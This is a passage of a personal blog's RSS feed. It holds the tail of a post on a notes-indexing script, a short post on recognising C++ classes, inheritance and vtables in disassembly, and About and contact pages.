&lt;span style=&#34;color:#75715e&#34;&gt;#  Ex#2: you have 2 notes with tags: note1: &amp;#39;q/w/e&amp;#39;, &amp;#39;e/w/q&amp;#39; (you have the same subtab &amp;#39;w&amp;#39;, but in totally different subtrees)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    Ignoring tag &amp;#39;w&amp;#39; will affect BOTH subtrees, &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#    It isn&amp;#39;t possible to ignore subtag only from specified tree! Ignoring &amp;#34;q/w&amp;#34; will not work!&lt;/span&gt;
IGNORE_TAGS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [] &lt;span style=&#34;color:#75715e&#34;&gt;# FIXME&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After running this script you should have &lt;code&gt;index.md&lt;/code&gt; file generated in your &lt;code&gt;NOTES_DIR&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;sync&#34;&gt;Sync&lt;/h3&gt;
&lt;p&gt;This is the simplest step, just create &lt;a href=&#34;https://www.dropbox.com/&#34;&gt;Dropbox&lt;/a&gt; account, put your notes there and sync your notes across all devices!&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>C&#43;&#43; assembly</title>
      <link>/posts/c&#43;&#43;-assembly/</link>
      <pubDate>Sat, 11 Jan 2020 14:50:06 +0100</pubDate>
      
      <guid>/posts/c&#43;&#43;-assembly/</guid>
      <description>Structures C struct vs C++ class C struct  functions are loosely correlated with paramaters, parameters are usually passed via pointer, it may look like array for struct with 2 identical parameters in struct, for structures created dynamically look for malloc with non-usual size.  C++ class  Find constructor, it have always 1 argument (this pointer -&amp;gt; thiscall), main() function have initialization function __main with ctor initlizers, after creation of class with new operator the class constructor is called (can be empty), Methods are called with thiscall convention.</description>
      <content>&lt;h2 id=&#34;structures&#34;&gt;Structures&lt;/h2&gt;
&lt;h3 id=&#34;c-struct-vs-c-class&#34;&gt;C struct vs C++ class&lt;/h3&gt;
&lt;h4 id=&#34;c-struct&#34;&gt;C struct&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;functions are loosely correlated with paramaters,&lt;/li&gt;
&lt;li&gt;parameters are usually passed via pointer,&lt;/li&gt;
&lt;li&gt;it may look like array for struct with 2 identical parameters in struct,&lt;/li&gt;
&lt;li&gt;for structures created dynamically look for &lt;code&gt;malloc&lt;/code&gt; with non-usual size.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;c-class&#34;&gt;C++ class&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Find constructor, it have always 1 argument (&lt;code&gt;this&lt;/code&gt; pointer -&amp;gt; &lt;code&gt;thiscall&lt;/code&gt;),&lt;/li&gt;
&lt;li&gt;&lt;code&gt;main()&lt;/code&gt; function have initialization function &lt;code&gt;__main&lt;/code&gt; with ctor initlizers,&lt;/li&gt;
&lt;li&gt;after creation of class with &lt;code&gt;new&lt;/code&gt; operator the class constructor is called (can be empty),&lt;/li&gt;
&lt;li&gt;Methods are called with &lt;code&gt;thiscall&lt;/code&gt; convention.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;inheritance&#34;&gt;Inheritance&lt;/h3&gt;
&lt;p&gt;Constructors of base class are called 1st in child class, additionally assigment to variables in class definition is put inside constructor:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __thiscall &lt;span style=&#34;color:#a6e22e&#34;&gt;Inherited&lt;/span&gt;(Inherited &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;)
{
  Box((Box &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// this was assigned in class definition, not constructor
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;b;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inherited destructors contains destructors of base class:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __thiscall &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;Inherited(Inherited &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;)

{
  &lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;Box((Box &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;virtuals&#34;&gt;Virtuals&lt;/h3&gt;
&lt;p&gt;Generally we have the same behaviour like in inheritance, but additionally we have also vtables.&lt;/p&gt;
&lt;p&gt;The structures of classess contains 1 additional field (at offset 0): &lt;code&gt;vptr&lt;/code&gt; to &lt;code&gt;vtable&lt;/code&gt; structure containing pointers to all virtual methods in this class:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vtable_class_A&lt;/span&gt; {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;virtual_func_1&lt;/span&gt;();
  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;virtual_func_2&lt;/span&gt;();
  &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://oalabs.openanalysis.net/2019/06/03/reverse-engineering-c-with-ida-pro-classes-constructors-and-structs/&#34;&gt;OA Labs&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    </item>
    
    <item>
      <title>About</title>
      <link>/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/about/</guid>
      <description>Hi all!
I created this blog mostly for sharing some interesting stuff from topics of my interests, like:
 reversing (mostly Windows binaries), development, my repo script demos - how to use them.  Most of my notes are created in note-like style - not without the reason -&amp;gt; it can be mine note which I decided to share. Each series should have individual tag with additional helper tags for better searching.</description>
      <content>&lt;p&gt;Hi all!&lt;/p&gt;
&lt;p&gt;I created this blog mostly for sharing some interesting stuff from topics of my interests, like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;reversing (mostly Windows binaries),&lt;/li&gt;
&lt;li&gt;development,&lt;/li&gt;
&lt;li&gt;my repo script demos - how to use them.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most of my notes are created in note-like style - not without the reason -&amp;gt; it can be mine note which I decided to share. Each series should have individual tag with additional helper tags for better searching.&lt;/p&gt;
&lt;p&gt;If you find my blog posts useful please let me know by contacting me via comments or by social media listed on &lt;a href=&#34;/contact&#34;&gt;contact&lt;/a&gt; page.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Contact me / Social Media</title>
      <link>/contact/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/contact/</guid>
      <description> [E-Mail] [Twitter] [Github] [Reddit] [BuyMeACoffee]  </description>
      <content>&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;mailto:trib0r3@criptext.com&#34;&gt;[E-Mail]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://twitter.com/trib0r3&#34;&gt;[Twitter]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/trib0r3&#34;&gt;[Github]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.reddit.com/user/sskx&#34;&gt;[Reddit]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.buymeacoffee.com/trib0r3&#34;&gt;[BuyMeACoffee]&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
  </channel>
</rss>
